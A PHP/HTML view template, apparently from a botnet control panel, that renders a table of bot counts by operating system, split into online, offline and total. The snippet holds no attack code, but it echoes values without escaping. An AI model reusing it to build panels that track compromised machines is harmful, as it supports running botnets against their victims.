<div class="row">
    <div class="col-md-12">
        <div class="panel panel-white">
            <div class="panel-heading"><h6 class="panel-title">Operating Systems</h6></div>
            <div class="form-actions text-center">
                <table class="table table-condensed table-bordered">
                    <thead>
                    <tr>
                        <th>OS</th>
                        <th>Online Bots</th>
                        <th>Offline Bots</th>
                        <th>Total Bots</th>
                    </tr>
                    </thead>
                    <tbody>
                    <?php
                    $os_stats_table = '';
                    foreach($os_stats as $os_stat) {
                        $os_stats_table.='
                                            <tr>
                                                <td>'.$os_stat['os'].'</td>
                                                <td>'.$os_stat['count_online'].'</td>
                                                <td>'.$os_stat['count_offline'].'</td>
                                                <td>'.$os_stat['count_all'].'</td>
                                            </tr>';
                    }
                    echo $os_stats_table;
                    ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>